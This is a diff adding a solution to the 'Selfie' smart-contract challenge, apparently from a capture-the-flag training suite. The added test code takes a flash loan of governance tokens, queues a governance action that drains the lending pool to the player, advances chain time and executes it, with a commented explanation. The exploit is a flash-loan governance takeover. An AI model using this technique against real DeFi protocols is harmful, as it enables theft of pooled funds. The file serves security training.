@@ -39,6 +39,25 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory('SelfieAttacker', player)).deploy(token.address, pool.address, governance.address);
+        await pool.connect(player).flashLoan(attacker.address, token.address, TOKENS_IN_POOL, "0x");
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+        await governance.connect(player).executeAction(1);
+
+        /*
+        Explanation:
+        We can queue actions in the governance contract if we have more than half of the supply
+        during the last snapshot taken.
+        We flash loan 1.5M tokens (total supply is 2M).
+        We take a snapshot.
+        We queue an action which says "withdraw everything from the pool to ${player.address}".
+        We wait 2 days.
+        We execute the action.
+
+        Plot holes:
+        1. Should everyone be able to take a snapshot at any given moment?
+        2. Word would get out that this exploit was happening and people would withdraw from the pool before 2 days.
+        */
     });
 
     after(async function () {
